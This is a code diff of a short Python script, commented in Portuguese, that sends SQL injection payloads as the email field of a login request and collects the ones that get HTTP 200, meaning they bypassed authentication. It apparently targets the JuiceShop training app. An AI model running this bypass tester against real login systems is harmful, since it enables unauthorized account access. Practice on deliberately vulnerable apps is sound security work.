@@ -31,18 +31,19 @@ def json_login_build(email, password):
     """Cria o payload JSON para o login."""
     return {
         "email": email,
-        "senha": password
+        "password": password
     }
 
 def sql_injection_test(payloads, url):
-    """Testa cada payload na lista de injeção SQL."""
+    """Testa cada payload na lista de injeção SQL e retorna os que funcionaram."""
+    # Lista de bypass que funcionaram
+    bypassed_payloads = []
     for payload in payloads:
-        json_login = json_login_build(payload, "password123")
+        json_login = json_login_build(payload, "password")
         response = login_test(url, json_login)
         if response.status_code == 200:
-            print(f"Payload -> {payload} <- may have bypassed authentication!")
-        else:
-            print(f"Payload -> {payload} <- did not bypass authentication.")
+            bypassed_payloads.append(payload)
+    return bypassed_payloads
 
 
 # Exemplo de uso no JuiceShop
